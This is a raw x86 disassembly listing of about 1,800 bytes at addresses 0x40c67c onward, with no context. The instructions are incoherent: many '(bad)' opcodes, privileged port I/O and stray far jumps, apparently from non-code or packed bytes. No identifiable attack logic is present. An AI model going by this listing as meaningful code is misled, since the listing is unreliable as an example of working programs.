  40c67c:	enter  0x36fd,0x5d
  40c680:	jo     0x40c602
  40c682:	pop    esp
  40c683:	mov    WORD PTR ds:0x84366d05,fs
  40c689:	add    ah,0x17
  40c68c:	dec    ebx
  40c68d:	mov    ecx,0xf63ab590
  40c692:	lods   al,BYTE PTR ds:[esi]
  40c693:	std    
  40c694:	(bad)  
  40c695:	cli    
  40c696:	aad    0x2a
  40c698:	nop
  40c699:	adc    al,0xda
  40c69b:	xor    DWORD PTR [eax-0xa6bdeb2],ecx
  40c6a1:	data16 mov dl,0xec
  40c6a4:	jecxz  0x40c6a2
  40c6a6:	jecxz  0x40c6cf
  40c6a8:	fdivr  QWORD PTR [ecx]
  40c6aa:	inc    ebx
  40c6ab:	jnp    0x40c636
  40c6ad:	push   ebp
  40c6af:	scas   eax,DWORD PTR es:[edi]
  40c6b0:	sub    ah,BYTE PTR [esi+0x28]
  40c6b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6b4:	(bad)  
  40c6b5:	mov    cl,0x48
  40c6b7:	test   eax,0x3d7864b9
  40c6bc:	ds jne 0x40c6cd
  40c6bf:	imul   ecx,DWORD PTR [edi],0x7f9b0f5f
  40c6c5:	fcomp  DWORD PTR [ebp+0x6fc93a22]
  40c6cb:	pushf  
  40c6cc:	jne    0x40c66e
  40c6ce:	idiv   DWORD PTR [esp+eax*1+0x62]
  40c6d2:	out    dx,al
  40c6d3:	or     eax,0x20e613d2
  40c6d8:	je     0x40c6c9
  40c6da:	pop    esp
  40c6db:	or     ch,dl
  40c6dd:	shr    DWORD PTR [ebx+0x59],cl
  40c6e0:	mov    bl,0xb9
  40c6e2:	mov    eax,DWORD PTR [eax+0x15]
  40c6e5:	cmp    al,0xbd
  40c6e7:	stos   BYTE PTR es:[edi],al
  40c6e8:	sar    esp,0x3
  40c6eb:	sbb    ecx,DWORD PTR [eax]
  40c6ed:	pop    ecx
  40c6ee:	sahf   
  40c6ef:	retf   
  40c6f0:	mov    WORD PTR [ecx+eax*8],fs
  40c6f3:	sub    bh,bh
  40c6f5:	out    dx,eax
  40c6f6:	test   BYTE PTR [edi],bl
  40c6f8:	data16 int 0xcf
  40c6fb:	cs mov bh,0xf2
  40c6fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6ff:	lock push esi
  40c701:	sbb    edi,DWORD PTR [esi-0x7298b6eb]
  40c707:	push   ebx
  40c708:	fisttp WORD PTR [eax+0x85f011e]
  40c70e:	mov    WORD PTR [eax+0x36],?
  40c711:	xchg   edx,eax
  40c712:	push   0x48c4b367
  40c717:	lods   eax,DWORD PTR ds:[esi]
  40c718:	adc    edi,DWORD PTR [eax-0x29]
  40c71b:	jae    0x40c78a
  40c71d:	adc    edi,DWORD PTR [ebp-0x5c7b7899]
  40c723:	dec    edx
  40c724:	sbb    dl,BYTE PTR [ebp+ecx*8+0x5f]
  40c728:	or     esi,DWORD PTR [ebp+0x41867dd4]
  40c72e:	sub    BYTE PTR [esi+0x58],dl
  40c731:	dec    eax
  40c732:	fdivr  DWORD PTR [edi-0x65d6199f]
  40c738:	add    BYTE PTR [edx+esi*8],dl
  40c73b:	and    edx,DWORD PTR [eax+0x2f]
  40c73e:	jno    0x40c765
  40c740:	push   DWORD PTR [eax+0x61]
  40c743:	call   0xf607:0xaf874740
  40c74a:	shl    BYTE PTR [edi],0xd6
  40c74d:	icebp  
  40c74e:	xchg   ebx,eax
  40c74f:	and    BYTE PTR [ecx],0xf9
  40c752:	loope  0x40c793
  40c754:	mov    ah,0xfc
  40c756:	pop    es
  40c757:	mov    dl,0x56
  40c759:	loope  0x40c770
  40c75b:	(bad)  
  40c75c:	retf   0xdd84
  40c75f:	imul   cl
  40c761:	pop    edx
  40c762:	test   al,0xd2
  40c764:	enter  0x62a6,0x9b
  40c768:	lods   al,BYTE PTR ds:[esi]
  40c769:	sbb    eax,0xfc5927d9
  40c76e:	jmp    0x7edd:0xb8876b40
  40c775:	(bad)  
  40c776:	sub    eax,0xb290fe28
  40c77b:	and    DWORD PTR [eax],eax
  40c77d:	in     al,dx
  40c77e:	pushf  
  40c77f:	push   esp
  40c780:	xchg   ebx,eax
  40c781:	mov    esp,0xbd9ba590
  40c786:	ins    BYTE PTR es:[edi],dx
  40c787:	sub    al,0x47
  40c789:	push   ds
  40c78a:	sbb    ebx,esi
  40c78c:	(bad)  
  40c78d:	fdivr  st(7),st
  40c78f:	cdq    
  40c790:	xor    DWORD PTR [eax+0x7],eax
  40c793:	mov    ebp,0x6c71aab1
  40c798:	ja     0x40c7a8
  40c79a:	dec    eax
  40c79b:	jbe    0x40c76c
  40c79d:	add    BYTE PTR [edi+ecx*2],0x70
  40c7a1:	sbb    al,0x71
  40c7a3:	xchg   edi,eax
  40c7a4:	in     al,dx
  40c7a5:	jno    0x40c7fb
  40c7a7:	rcr    DWORD PTR [edx-0x49],0xd4
  40c7ab:	into   
  40c7ac:	ja     0x40c780
  40c7ae:	popa   
  40c7af:	test   DWORD PTR [edi+ebp*1+0x2964c897],edx
  40c7b6:	jecxz  0x40c7ac
  40c7b8:	xor    BYTE PTR [ecx-0x4092c57f],0xbb
  40c7bf:	xlat   BYTE PTR ds:[ebx]
  40c7c0:	and    ah,bl
  40c7c2:	mov    esi,edx
  40c7c4:	fldcw  WORD PTR [edi-0x35]
  40c7c7:	pop    ebx
  40c7c8:	or     DWORD PTR [edi+edx*4-0xf202ae3],ebx
  40c7cf:	sbb    BYTE PTR [esi],dl
  40c7d1:	aaa    
  40c7d2:	out    0x25,eax
  40c7d4:	jmp    0x40c81d
  40c7d6:	add    edi,edx
  40c7d8:	push   esi
  40c7d9:	je     0x40c7ad
  40c7db:	or     bh,al
  40c7dd:	mov    dl,0x8
  40c7df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c7e0:	popf   
  40c7e1:	mov    bl,0xcc
  40c7e3:	pop    edx
  40c7e4:	addr16 sbb eax,0x2f6850a
  40c7ea:	push   0xffffffb0
  40c7ec:	or     eax,0x66d2ed69
  40c7f1:	popf   
  40c7f2:	sub    al,0xeb
  40c7f4:	in     eax,dx
  40c7f5:	xor    al,0x9b
  40c7f7:	enter  0x183b,0xd4
  40c7fb:	ret    0x403
  40c7fe:	inc    esp
  40c7ff:	sbb    DWORD PTR [edi*1+0x577fcf14],0x1e3c1dc2
  40c80a:	mul    DWORD PTR [eax+0x56]
  40c80d:	shl    ebx,cl
  40c80f:	or     BYTE PTR [edx],dl
  40c811:	xor    dh,BYTE PTR [ebp+0x78cdd25b]
  40c817:	mov    edi,0x8d957bff
  40c81c:	jb     0x40c84a
  40c81e:	xor    esi,edx
  40c820:	add    ah,BYTE PTR [ecx+0x47]
  40c823:	adc    dh,BYTE PTR [esi-0xe26917d]
  40c829:	arpl   WORD PTR [esi-0x2b4b5b88],dx
  40c82f:	jp     0x40c845
  40c831:	std    
  40c832:	lahf   
  40c833:	test   ecx,ebx
  40c835:	and    si,WORD PTR [esi]
  40c838:	gs repnz push eax
  40c83b:	adc    dh,ah
  40c83d:	cld    
  40c83e:	dec    ebp
  40c83f:	lds    eax,FWORD PTR [ecx-0x22]
  40c842:	add    DWORD PTR [edx-0x2d],eax
  40c845:	jae    0x40c81c
  40c847:	retf   0x6f2a
  40c84a:	ss rcl ch,1
  40c84d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c84e:	cs push ebp
  40c850:	sbb    al,0x48
  40c852:	jmp    0x28fdf2ae
  40c857:	jmp    0x2161:0x818edffb
  40c85e:	outs   dx,BYTE PTR ds:[esi]
  40c85f:	or     edi,esi
  40c861:	xor    eax,0x8e3fc642
  40c866:	xlat   BYTE PTR ds:[ebx]
  40c867:	ds xchg esi,eax
  40c869:	ret    0x1457
  40c86c:	retf   
  40c86d:	(bad)  
  40c86e:	out    dx,al
  40c86f:	mov    al,ds:0xa186c71d
  40c874:	push   eax
  40c875:	adc    eax,0x5578bfe8
  40c87a:	sbb    BYTE PTR [ecx],dh
  40c87c:	outs   dx,BYTE PTR ds:[esi]
  40c87d:	mov    edx,0x7ed754fc
  40c882:	stos   BYTE PTR es:[edi],al
  40c883:	adc    bl,cl
  40c885:	push   eax
  40c886:	imul   edx,esi,0x76e1198d
  40c88c:	mov    ch,0xc7
  40c88e:	and    bl,ah
  40c890:	leave  
  40c891:	xor    BYTE PTR [eax-0x32],dh
  40c894:	jnp    0x40c819
  40c896:	lds    eax,FWORD PTR [ecx-0x74]
  40c899:	iret   
  40c89a:	outs   dx,DWORD PTR ds:[esi]
  40c89b:	xchg   esp,esp
  40c89d:	call   0x80eb:0x4ab99e65
  40c8a4:	outs   dx,BYTE PTR ds:[esi]
  40c8a5:	pushf  
  40c8a6:	mov    edi,0xef75410a
  40c8ab:	mov    gs,WORD PTR gs:[edi]
  40c8ae:	inc    edi
  40c8af:	stos   BYTE PTR es:[edi],al
  40c8b0:	shr    eax,0x62
  40c8b3:	in     eax,0xaa
  40c8b5:	in     eax,dx
  40c8b6:	jne    0x40c90f
  40c8b8:	pop    eax
  40c8b9:	adc    BYTE PTR gs:[ebp+0x39a13157],bh
  40c8c0:	lea    ecx,[esi]
  40c8c2:	mov    dl,BYTE PTR [edi]
  40c8c4:	popa   
  40c8c5:	retf   0xc05c
  40c8c8:	pop    esi
  40c8c9:	mov    eax,ds:0xb91ddd7d
  40c8ce:	rol    ch,1
  40c8d0:	repnz cmp cl,0x94
  40c8d4:	cmc    
  40c8d5:	lods   eax,DWORD PTR ds:[esi]
  40c8d6:	inc    edi
  40c8d7:	and    dl,BYTE PTR [ecx-0x7f]
  40c8da:	imul   eax,DWORD PTR [ebx+0x1c2214e0],0x231ad5b0
  40c8e4:	xchg   esp,eax
  40c8e5:	aad    0x84
  40c8e7:	retf   
  40c8e8:	xchg   DWORD PTR [eax+esi*2],ebp
  40c8eb:	dec    ebp
  40c8ec:	mov    eax,ds:0x404520f4
  40c8f1:	inc    ebp
  40c8f2:	dec    ebp
  40c8f3:	adc    cl,dh
  40c8f5:	mov    ebx,0xe2887187
  40c8fa:	push   esi
  40c8fb:	inc    edx
  40c8fc:	inc    ecx
  40c8fd:	xchg   BYTE PTR [esi],cl
  40c8ff:	ficom  WORD PTR [ebx+0x2e]
  40c902:	jp     0x40c904
  40c904:	mov    edx,?
  40c906:	adc    al,0x65
  40c908:	xor    DWORD PTR [eax],0x6e
  40c90b:	aam    0x9e
  40c90d:	inc    esi
  40c90e:	addr16 jae 0x40c910
  40c911:	cs jae 0x40c916
  40c914:	cs pop es
  40c916:	pop    DWORD PTR [esi+0x2]
  40c919:	gs scas eax,DWORD PTR es:[edi]
  40c91b:	pop    eax
  40c91c:	adc    DWORD PTR [ebx-0x5c0194df],esp
  40c922:	or     BYTE PTR [ecx],bh
  40c924:	push   esp
  40c925:	rcr    DWORD PTR [edx-0x72],cl
  40c928:	push   ebp
  40c929:	out    0xeb,eax
  40c92b:	pop    ds
  40c92c:	iret   
  40c92d:	das    
  40c92e:	adc    al,0x60
  40c930:	pop    ss
  40c931:	test   dh,bh
  40c933:	daa    
  40c934:	ror    ebx,cl
  40c936:	xor    eax,0xd567a7fd
  40c93b:	scas   eax,DWORD PTR es:[edi]
  40c93c:	lds    esi,FWORD PTR [ebx]
  40c93e:	mov    esp,0x756e54c2
  40c943:	mov    al,ds:0x868baf9
  40c948:	or     BYTE PTR [eax+0x20],ch
  40c94b:	pop    ebp
  40c94c:	pop    ebx
  40c94d:	fcmovnbe st,st(3)
  40c94f:	mov    bl,0x55
  40c951:	push   edx
  40c952:	xchg   BYTE PTR [ebp+ebp*4+0x4c],bh
  40c956:	jb     0x40c99f
  40c958:	pop    esi
  40c959:	mov    edi,0x196ac7c6
  40c95e:	scas   eax,DWORD PTR es:[edi]
  40c95f:	mov    cl,0x9d
  40c961:	mov    bh,0x2e
  40c963:	and    eax,0xa393dcaa
  40c968:	inc    ecx
  40c969:	fistp  WORD PTR [ebx+0x5157d41d]
  40c96f:	rcl    BYTE PTR [esi+ecx*4-0x30],1
  40c973:	repnz xchg esi,eax
  40c975:	jno    0x40c9be
  40c977:	out    dx,al
  40c978:	pop    ebp
  40c979:	adc    ebp,DWORD PTR [edx-0x187be191]
  40c97f:	imul   DWORD PTR [esi]
  40c981:	add    al,0x80
  40c983:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c984:	ins    BYTE PTR es:[edi],dx
  40c985:	push   ds
  40c986:	ds test eax,0xa6e205a2
  40c98c:	ret    0xf46
  40c98f:	or     DWORD PTR [ebx+ebx*1],ecx
  40c992:	not    BYTE PTR [edx]
  40c994:	neg    BYTE PTR [ecx+0x60]
  40c997:	leave  
  40c998:	push   ecx
  40c999:	add    ch,BYTE PTR [eax+0x2e9015ac]
  40c99f:	outs   dx,DWORD PTR ds:[esi]
  40c9a0:	cld    
  40c9a1:	je     0x40c97e
  40c9a3:	add    dl,BYTE PTR [edi+0x4f]
  40c9a6:	and    al,0xd4
  40c9a8:	imul   cl
  40c9aa:	neg    bh
  40c9ac:	mov    ebx,0x1811b2f1
  40c9b1:	mov    DWORD PTR ds:0x5bc78f23,edi
  40c9b7:	clc    
  40c9b8:	fstp   st(2)
  40c9ba:	push   es
  40c9bb:	sti    
  40c9bc:	push   0x65
  40c9be:	fld    DWORD PTR [eax-0x17b0b25b]
  40c9c4:	xchg   BYTE PTR [ecx+0x2b],ch
  40c9c7:	mov    bl,0x20
  40c9c9:	sub    BYTE PTR [ebx+0x21326b39],dl
  40c9cf:	pop    edi
  40c9d0:	jb     0x40c959
  40c9d2:	cld    
  40c9d3:	repz sub al,0xc5
  40c9d6:	(bad)  
  40c9d7:	int    0x4b
  40c9d9:	push   ss
  40c9da:	push   es
  40c9db:	sub    edi,DWORD PTR [esi-0x36ad4b92]
  40c9e1:	loopne 0x40c9cd
  40c9e3:	test   BYTE PTR [ebp+0x66812fbc],dl
  40c9e9:	ins    BYTE PTR es:[edi],dx
  40c9ea:	dec    ecx
  40c9eb:	inc    esp
  40c9ec:	popf   
  40c9ed:	jl     0x40c994
  40c9ef:	dec    ebp
  40c9f0:	jo     0x40c9bb
  40c9f2:	xchg   BYTE PTR [edi-0x18b30c20],dh
  40c9f8:	sbb    edi,DWORD PTR [edx]
  40c9fa:	inc    esi
  40c9fb:	sbb    ebp,DWORD PTR [edi+0x2a487744]
  40ca01:	mov    WORD PTR [edx-0x329d6fcb],es
  40ca07:	mov    dl,0x84
  40ca09:	(bad)  
  40ca0a:	ror    BYTE PTR [eax-0xdee39c3],cl
  40ca10:	and    BYTE PTR [eax+0x40],dl
  40ca13:	cmp    al,0xeb
  40ca15:	lock pop es
  40ca17:	(bad)  
  40ca19:	cmp    eax,0x294c75c4
  40ca1e:	jl     0x40ca85
  40ca20:	pusha  
  40ca21:	pop    esi
  40ca22:	mov    edx,0xf2894dcf
  40ca27:	mov    dh,0xf1
  40ca29:	loope  0x40ca60
  40ca2b:	push   0x3592652e
  40ca30:	pushf  
  40ca31:	sbb    al,0x26
  40ca33:	sub    ecx,esp
  40ca35:	test   BYTE PTR es:[eax-0x6f],al
  40ca39:	push   ecx
  40ca3a:	outs   dx,DWORD PTR ds:[esi]
  40ca3b:	jae    0x40ca79
  40ca3d:	fwait
  40ca3e:	jecxz  0x40c9e5
  40ca40:	ss pop edx
  40ca42:	fsub   QWORD PTR [edx-0x5beb8697]
  40ca48:	pop    ecx
  40ca49:	xlat   BYTE PTR ds:[ebx]
  40ca4a:	mov    al,0xfa
  40ca4c:	repnz pop edx
  40ca4e:	ja     0x40ca56
  40ca50:	mov    eax,0x3b03398d
  40ca55:	xchg   edi,eax
  40ca56:	or     ebp,edx
  40ca58:	scas   eax,DWORD PTR es:[edi]
  40ca59:	mov    al,ah
  40ca5b:	sahf   
  40ca5c:	std    
  40ca5d:	scas   eax,DWORD PTR es:[edi]
  40ca5e:	lds    edx,FWORD PTR [edi]
  40ca60:	icebp  
  40ca61:	loop   0x40ca0a
  40ca63:	imul   esp,ebx,0xd53ffffe
  40ca69:	addr16 out dx,eax
  40ca6b:	imul   edi,DWORD PTR [ebx+0x19f6584],0xa6c94f6
  40ca75:	ins    BYTE PTR es:[edi],dx
  40ca76:	sar    DWORD PTR [esp+eax*8],0xf1
  40ca7a:	jle    0x40ca13
  40ca7c:	pop    edi
  40ca7d:	out    dx,al
  40ca7e:	cmp    BYTE PTR [eax+0x220900ce],ch
  40ca84:	jno    0x40ca77
  40ca86:	les    esi,FWORD PTR [edx+edx*1]
  40ca89:	pop    ebx
  40ca8a:	gs or  al,0x1b
  40ca8d:	pushf  
  40ca8e:	daa    
  40ca8f:	lahf   
  40ca90:	adc    BYTE PTR [edx],bl
  40ca92:	pop    ebp
  40ca93:	cmp    ah,BYTE PTR ds:0x974c923d
  40ca99:	iret   
  40ca9a:	or     eax,0xdd7493c8
  40ca9f:	mov    cl,0xe8
  40caa1:	sub    BYTE PTR [edi+0x5c],ch
  40caa4:	mov    eax,0x7aa52c74
  40caa9:	iret   
  40caaa:	cdq    
  40caab:	stos   BYTE PTR es:[edi],al
  40caac:	inc    edi
  40caad:	cmp    al,0x8
  40caaf:	pusha  
  40cab0:	lods   eax,DWORD PTR ds:[esi]
  40cab1:	in     al,0x4b
  40cab3:	test   al,0x14
  40cab5:	cld    
  40cab6:	stc    
  40cab7:	and    ah,cl
  40cab9:	mov    dl,0xd1
  40cabb:	dec    esi
  40cabc:	(bad)  
  40cabe:	dec    esp
  40cabf:	test   BYTE PTR [edx-0x2],ch
  40cac2:	lods   eax,DWORD PTR ds:[esi]
  40cac3:	enter  0x475b,0xb8
  40cac7:	add    dl,dl
  40cac9:	jno    0x40caf4
  40cacb:	sub    al,BYTE PTR gs:[edx]
  40cace:	jmp    0xc328e04e
  40cad3:	dec    ebp
  40cad4:	push   ds
  40cad5:	sub    BYTE PTR [edx-0x6e],dh
  40cad8:	in     eax,dx
  40cad9:	hlt    
  40cada:	mov    esp,0x635dd434
  40cadf:	in     eax,dx
  40cae0:	push   es
  40cae1:	stc    
  40cae2:	inc    esp
  40cae3:	(bad)  
  40cae5:	inc    ecx
  40cae6:	mov    ecx,0xa8b4fe14
  40caeb:	not    edx
  40caed:	xlat   BYTE PTR ds:[ebx]
  40caee:	sbb    bh,cl
  40caf0:	mov    ebx,?
  40caf2:	jge    0x40caf9
  40caf4:	daa    
  40caf5:	lahf   
  40caf6:	fwait
  40caf7:	inc    eax
  40caf8:	inc    esp
  40caf9:	jle    0x40cabb
  40cafb:	retf   0x6054
  40cafe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40caff:	aam    0x4
  40cb01:	jne    0x40cacf
  40cb03:	jmp    0x40cad1
  40cb05:	and    ch,al
  40cb07:	iret   
  40cb08:	ins    DWORD PTR es:[edi],dx
  40cb09:	ss mov ebx,0xe934542a
  40cb0f:	imul   esi,DWORD PTR [eax-0x6eca858a],0x2695760f
  40cb19:	adc    DWORD PTR [edx-0x79],ecx
  40cb1c:	gs stos BYTE PTR es:[edi],al
  40cb1e:	test   BYTE PTR [ebx-0x2ec717c9],bl
  40cb24:	inc    eax
  40cb25:	mov    ds:0x6863cccc,eax
  40cb2a:	repnz mov ecx,0xffa1509f
  40cb30:	adc    eax,0x6d684800
  40cb35:	stos   DWORD PTR es:[edi],eax
  40cb36:	(bad)  
  40cb37:	jp     0x40cbb8
  40cb39:	jo     0x40cb1a
  40cb3b:	push   0xffffffc6
  40cb3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb3e:	mov    edx,0x58aa3554
  40cb43:	and    al,0xbc
  40cb45:	dec    edx
  40cb46:	aaa    
  40cb47:	sub    ecx,ebx
  40cb49:	test   DWORD PTR [esi],0x72f73b28
  40cb4f:	mov    DWORD PTR [eax],esi
  40cb51:	mov    al,BYTE PTR [eax-0x7d]
  40cb54:	cmp    al,0xa3
  40cb56:	sbb    DWORD PTR [eax-0x20bacf66],eax
  40cb5c:	jge    0x40cbdc
  40cb5e:	lahf   
  40cb5f:	mov    al,BYTE PTR [edi+0x5758df3]
  40cb65:	scas   al,BYTE PTR es:[edi]
  40cb66:	jne    0x40caf7
  40cb68:	inc    eax
  40cb69:	imul   esi,ebp,0xffffff97
  40cb6c:	repnz mov esi,0x83e0f5ca
  40cb72:	and    DWORD PTR [ecx-0x3f],esi
  40cb75:	jg     0x40cb35
  40cb77:	add    BYTE PTR [ebp+0x4],al
  40cb7a:	mov    ebx,0x95645c2a
  40cb7f:	js     0x40cb08
  40cb81:	mov    cl,0x10
  40cb83:	push   esi
  40cb84:	jecxz  0x40cb66
  40cb86:	xchg   ebp,eax
  40cb87:	add    bh,BYTE PTR [edi]
  40cb89:	adc    ebx,DWORD PTR [ebp-0x34]
  40cb8c:	pop    esi
  40cb8d:	inc    eax
  40cb8e:	ror    DWORD PTR [esi],0x8c
  40cb91:	or     bh,BYTE PTR [ebx+ecx*2-0x5e4216cc]
  40cb98:	fldcw  WORD PTR [eax+esi*1]
  40cb9b:	sahf   
  40cb9c:	enter  0x39cf,0x7f
  40cba0:	pop    ebx
  40cba1:	jns    0x40cb4d
  40cba3:	add    cl,BYTE PTR [ecx+0x6701fb30]
  40cba9:	out    0xef,eax
  40cbab:	pop    ecx
  40cbac:	ins    BYTE PTR es:[edi],dx
  40cbad:	rol    BYTE PTR [edi+0x2b],cl
  40cbb0:	or     DWORD PTR [ecx],edi
  40cbb2:	add    eax,0x351e1bcb
  40cbb7:	(bad)  
  40cbb9:	jge    0x40cb41
  40cbbb:	inc    ebx
  40cbbc:	rcr    DWORD PTR [ebp+0x44],0xd0
  40cbc0:	dec    ebx
  40cbc1:	push   0x961e27e8
  40cbc6:	mov    ch,0xd9
  40cbc8:	push   ss
  40cbc9:	das    
  40cbca:	arpl   WORD PTR [esi+ebp*1],di
  40cbcd:	fadd   QWORD PTR [edx]
  40cbcf:	pop    edi
  40cbd0:	lods   al,BYTE PTR ds:[esi]
  40cbd1:	or     BYTE PTR [ecx+eax*8-0x66],al
  40cbd5:	loopne 0x40cbd6
  40cbd7:	push   ebp
  40cbd8:	sub    bl,BYTE PTR [ecx+0x1a]
  40cbdb:	sub    DWORD PTR [esi-0x41],0x5d
  40cbdf:	dec    edi
  40cbe0:	imul   esp,DWORD PTR [esi],0xefff5a44
  40cbe6:	jmp    0x1a6b:0xd29b3485
  40cbed:	pop    ds
  40cbee:	loop   0x40cc1f
  40cbf0:	dec    esi
  40cbf1:	mov    ebx,0xaa6c3268
  40cbf6:	jmp    0x71eab73
  40cbfb:	shl    DWORD PTR [eax+0x75d281ac],0x2
  40cc02:	pop    ecx
  40cc03:	scas   eax,DWORD PTR es:[edi]
  40cc04:	xor    dh,BYTE PTR [edi]
  40cc06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc07:	fstp   st(2)
  40cc09:	rcl    DWORD PTR [ecx+0x2b],cl
  40cc0c:	pop    esi
  40cc0d:	retf   0x1494
  40cc10:	fistp  DWORD PTR [eax-0x3128c1f0]
  40cc16:	mov    edi,0xe06eed6f
  40cc1b:	mov    ah,BYTE PTR [ebp-0x31c2587e]
  40cc21:	push   ss
  40cc22:	aad    0x95
  40cc24:	pusha  
  40cc25:	cs dec ebp
  40cc27:	ret    
  40cc28:	cli    
  40cc29:	pop    edx
  40cc2a:	int    0xa2
  40cc2c:	xor    al,ah
  40cc2e:	aas    
  40cc2f:	popa   
  40cc30:	jl     0x40cc3c
  40cc32:	sbb    BYTE PTR [eax],0x45
  40cc35:	sub    eax,0x8064fbe1
  40cc3a:	fs popf 
  40cc3c:	out    dx,eax
  40cc3d:	fst    DWORD PTR [eax+eax*2+0x28fa19aa]
  40cc44:	xchg   esi,eax
  40cc45:	mov    eax,ds:0xf45fa257
  40cc4a:	xor    al,0x70
  40cc4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc4d:	sahf   
  40cc4e:	outs   dx,BYTE PTR ds:[esi]
  40cc4f:	cwde   
  40cc50:	outs   dx,DWORD PTR ds:[esi]
  40cc51:	or     edx,DWORD PTR [ecx]
  40cc53:	icebp  
  40cc54:	cmp    al,0x85
  40cc56:	pop    es
  40cc57:	into   
  40cc58:	push   0xb57e6f76
  40cc5d:	adc    DWORD PTR [ecx+0x2],eax
  40cc60:	adc    ebp,DWORD PTR [ebx]
  40cc62:	ficomp WORD PTR [ecx+0x1f]
  40cc65:	loope  0x40cc60
  40cc67:	cdq    
  40cc68:	and    cl,ah
  40cc6a:	add    dh,BYTE PTR ds:0x5780e5f5
  40cc70:	js     0x40ccdc
  40cc72:	loope  0x40cc3a
  40cc74:	imul   esp,DWORD PTR [ecx],0x9f84da2a
  40cc7a:	iret   
  40cc7b:	jb     0x40cc24
  40cc7d:	mov    ds:0x845cc0c5,eax
  40cc82:	and    ecx,DWORD PTR [esi]
  40cc84:	(bad)  
  40cc85:	and    edi,ebx
  40cc87:	cwde   
  40cc88:	stos   DWORD PTR es:[edi],eax
  40cc89:	cld    
  40cc8a:	or     edi,DWORD PTR [edx+0x55]
  40cc8d:	mov    esi,0xdfe240cc
  40cc92:	sub    BYTE PTR [ecx],0x54
  40cc95:	test   al,0x37
  40cc97:	mov    tr0,esi
  40cc9a:	adc    eax,esi
  40cc9c:	xor    dl,dh
  40cc9e:	rcr    BYTE PTR [eax+edi*8-0x2406bdcf],cl
  40cca5:	fimul  DWORD PTR [eax]
  40cca7:	dec    edx
  40cca8:	aad    0x8b
  40ccaa:	outs   dx,BYTE PTR ds:[esi]
  40ccab:	mov    edi,0x5018b047
  40ccb0:	(bad)  
  40ccb1:	cmp    BYTE PTR [eax-0x58],ch
  40ccb4:	lea    eax,[edi]
  40ccb6:	scas   eax,DWORD PTR es:[edi]
  40ccb7:	push   edx
  40ccb8:	add    BYTE PTR [edx-0x32],0x8c
  40ccbc:	and    eax,0x4d916604
  40ccc1:	out    dx,eax
  40ccc2:	push   edi
  40ccc3:	clc    
  40ccc4:	jmp    0x919194d6
  40ccc9:	outs   dx,BYTE PTR ds:[esi]
  40ccca:	das    
  40cccb:	xchg   ebp,eax
  40cccc:	rol    esi,0x15
  40cccf:	fwait
  40ccd0:	in     al,0x9f
  40ccd2:	shr    BYTE PTR [edx+0x6a],1
  40ccd5:	adc    ebp,0x64cb84ed
  40ccdb:	inc    esi
  40ccdc:	sbb    BYTE PTR [ecx-0x16],bh
  40ccdf:	and    cl,BYTE PTR ds:0x68f5ee25
  40cce5:	pushf  
  40cce6:	dec    ebp
  40cce7:	mov    esp,0x3c15e782
  40ccec:	test   eax,ebp
  40ccee:	fwait
  40ccef:	pop    ebp
  40ccf0:	push   eax
  40ccf1:	lock sahf 
  40ccf3:	jae    0x40cd58
  40ccf5:	lods   eax,DWORD PTR ds:[esi]
  40ccf6:	sahf   
  40ccf7:	adc    BYTE PTR [edx-0x296f2b97],0x50
  40ccfe:	leave  
  40ccff:	in     eax,dx
  40cd00:	xchg   edx,eax
  40cd01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd02:	inc    edx
  40cd03:	and    BYTE PTR [edx+0x7],bh
  40cd06:	jb     0x40ccbd
  40cd08:	aaa    
  40cd09:	cwde   
  40cd0a:	jmp    0x40cc9a
  40cd0c:	retf   
  40cd0d:	and    al,0x7a
  40cd0f:	jo     0x40cd53
  40cd11:	(bad)  
  40cd12:	push   edi
  40cd13:	jp     0x40cd8a
  40cd15:	mov    ah,0xa4
  40cd17:	xchg   esi,eax
  40cd18:	inc    esp
  40cd19:	mov    dl,0xb8
  40cd1b:	xchg   edx,eax
  40cd1c:	push   0xc549260c
  40cd21:	inc    edi
  40cd22:	xchg   edi,eax
  40cd23:	push   0x3f
  40cd25:	(bad)  
  40cd26:	jmp    0x40cd5d
  40cd28:	ret    0xbb9e
  40cd2b:	(bad)  
  40cd2c:	dec    ecx
  40cd2d:	or     cl,dl
  40cd2f:	add    eax,0xe1efbd47
  40cd34:	pop    ecx
  40cd35:	lds    ebx,FWORD PTR [edi-0x54694913]
  40cd3b:	sbb    DWORD PTR [eax+ebp*8+0x626446dc],ebp
  40cd42:	cmp    al,0x2
  40cd44:	enter  0x835d,0x5f
  40cd48:	stos   BYTE PTR es:[edi],al
  40cd49:	jno    0x40cd2a
  40cd4b:	sub    eax,0xf667c1b3
  40cd50:	cli    
  40cd51:	aam    0x15
  40cd53:	popf   
  40cd54:	cmp    ebp,DWORD PTR [ebx+0x48d26f54]
  40cd5a:	adc    eax,0x745c141f
  40cd5f:	sbb    bh,dl
  40cd61:	mov    edx,0x39b17ccb
  40cd66:	fadd   st(0),st
  40cd68:	lds    ecx,FWORD PTR [ebx+edx*4+0x37e2833c]
  40cd6f:	mov    edx,0x79c2eff1
  40cd74:	pop    ebp
  40cd75:	int    0x4
  40cd77:	inc    edx
  40cd78:	rcl    ecx,0x39
  40cd7b:	stos   BYTE PTR es:[edi],al
  40cd7c:	xor    ah,0x19
  40cd7f:	shr    BYTE PTR [ecx+0x6ff69347],1
  40cd85:	mov    esi,0x76cbd66
  40cd8a:	jge    0x40cd3a
  40cd8c:	test   DWORD PTR [eax-0x3bbc12ac],eax
  40cd92:	retf   0x8aba
  40cd95:	jnp    0x40cd21
  40cd97:	lods   al,BYTE PTR ds:[esi]
  40cd98:	mov    ecx,0x1d806388
  40cd9d:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd9f:	rcr    DWORD PTR ds:0x24c31220,0x16
  40cda6:	mul    esp
  40cda8:	lods   eax,DWORD PTR ds:[esi]
  40cda9:	pushf  
  40cdaa:	xchg   edi,eax
  40cdab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cdac:	inc    eax
  40cdad:	fwait
  40cdae:	sbb    al,0xbc
